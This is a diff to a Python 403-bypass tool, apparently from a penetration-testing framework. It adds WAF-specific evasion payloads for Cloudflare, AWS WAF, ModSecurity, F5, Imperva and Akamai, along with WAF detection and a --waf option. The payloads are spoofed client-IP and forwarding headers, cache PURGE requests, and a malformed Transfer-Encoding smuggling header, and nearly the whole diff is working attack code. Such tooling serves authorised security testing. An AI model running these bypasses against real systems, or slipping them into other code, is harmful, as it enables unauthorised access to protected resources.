@@ -229,7 +229,54 @@ def _path_mutations(path: str) -> list[tuple[str, str]]:
     return muts, raw_muts
 
 
-def _iter_techniques(scheme: str, host: str, port: int, path: str, full_url: str):
+# ── WAF 专用绕过 payload ──
+_WAF_PAYLOADS: dict[str, list[tuple[str, str, dict]]] = {
+    "cloudflare": [
+        ("waf-cf-ipcountry", "GET", {"CF-IPCountry": "US"}),
+        ("waf-cf-worker", "GET", {"CF-Worker": "graphpt.workers.dev"}),
+        ("waf-cf-true-client-ip", "GET", {"True-Client-IP": _FAKE_IP}),
+        ("waf-cf-cache-purge", "PURGE", {}),
+    ],
+    "aws-waf": [
+        ("waf-aws-xff-chain", "GET", {"X-Forwarded-For": "127.0.0.1, 127.0.0.1, 127.0.0.1"}),
+    ],
+    "modsecurity": [
+        ("waf-modsec-ct", "POST", {"Content-Type": "multipart/form-data; boundary=x"}),
+        ("waf-modsec-chunked", "GET", {"Transfer-Encoding": "chunked"}),
+    ],
+    "f5-bigip": [
+        ("waf-f5-xfh", "GET", {"X-Forwarded-Host": "127.0.0.1"}),
+    ],
+    "imperva": [
+        ("waf-imperva-xff-chain", "GET", {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"}),
+        ("waf-imperva-via", "GET", {"Via": "1.1 example.com"}),
+    ],
+    "akamai": [
+        ("waf-akamai-pragma", "GET", {"Pragma": "akamai-x-get-cache-key"}),
+        ("waf-akamai-tcip", "GET", {"True-Client-IP": _FAKE_IP}),
+    ],
+    "generic": [
+        ("waf-gen-smuggle", "GET", {"Transfer-Encoding": " chunked"}),
+    ],
+}
+
+
+def _parse_waf(tech_str: str) -> str:
+    """tech 字符串 → 已知 WAF 类型。"""
+    if not tech_str:
+        return ""
+    t = tech_str.lower()
+    if "cloudflare" in t: return "cloudflare"
+    if "aws" in t or "awswaf" in t: return "aws-waf"
+    if "modsecurity" in t or "modsec" in t: return "modsecurity"
+    if "f5" in t or "bigip" in t or "big-ip" in t: return "f5-bigip"
+    if "imperva" in t or "incapsula" in t: return "imperva"
+    if "akamai" in t: return "akamai"
+    if "waf" in t: return "generic"
+    return ""
+
+
+def _iter_techniques(scheme: str, host: str, port: int, path: str, full_url: str, waf: str = ""):
     """产出所有绕过 spec：(technique, method, path, headers, version, raw)。"""
     real_path = path.split("?", 1)[0] or "/"
 
@@ -264,6 +311,15 @@ def _iter_techniques(scheme: str, host: str, port: int, path: str, full_url: str
     # G. 协议降级（走 raw socket 才能真正发 HTTP/1.0）
     yield ("proto-http10", "GET", real_path, {}, "HTTP/1.0", True)
 
+    # H. WAF 自适应 payload
+    waf_type = _parse_waf(waf)
+    if waf_type and waf_type in _WAF_PAYLOADS:
+        for tech, method, headers in _WAF_PAYLOADS[waf_type]:
+            yield (tech, method, real_path, headers, "HTTP/1.1", False)
+    if waf_type and waf_type != "generic":
+        for tech, method, headers in _WAF_PAYLOADS.get("generic", []):
+            yield (tech, method, real_path, headers, "HTTP/1.1", False)
+
 
 def _is_success(status: int, body_len: int, base_status: int, base_len: int) -> bool:
     """判定绕过成功：状态码非 403 且响应体与基线 403 页明显不同。"""
@@ -275,7 +331,7 @@ def _is_success(status: int, body_len: int, base_status: int, base_len: int) -> 
     return True
 
 
-def run(url: str, target_id: str, timeout: float) -> dict:
+def run(url: str, target_id: str, timeout: float, waf: str = "") -> dict:
     """对一个 403 目标跑全量绕过，返回 {attempts, successes, results}。"""
     scheme, host, port, path = _split_url(url)
     if not host:
@@ -292,7 +348,7 @@ def run(url: str, target_id: str, timeout: float) -> dict:
 
     results = []
     attempts = 0
-    for tech, method, mpath, headers, version, raw in _iter_techniques(scheme, host, port, path, url):
+    for tech, method, mpath, headers, version, raw in _iter_techniques(scheme, host, port, path, url, waf):
         attempts += 1
         fn = _raw_request if raw else _request
         r = fn(method, scheme, host, port, mpath, headers=headers, http_version=version, timeout=timeout)
@@ -326,9 +382,10 @@ def main() -> int:
     ap.add_argument("--url", required=True, help="要绕过的 403 资源完整 URL")
     ap.add_argument("--target-id", default="", help="DirEntry/HTTPEndpoint 节点 id（回写用）")
     ap.add_argument("--timeout", type=float, default=_DEFAULT_TIMEOUT, help="单请求超时秒数")
+    ap.add_argument("--waf", default="", help="WAF/tech 类型 (逗号分隔)，用于选择专用绕过 payload")
     args = ap.parse_args()
 
-    out = run(args.url, args.target_id, args.timeout)
+    out = run(args.url, args.target_id, args.timeout, args.waf)
     # 成功结果以 JSONL 输出到 stdout，供 adapter 解析入图
     for item in out["results"]:
         print(json.dumps(item, ensure_ascii=False))
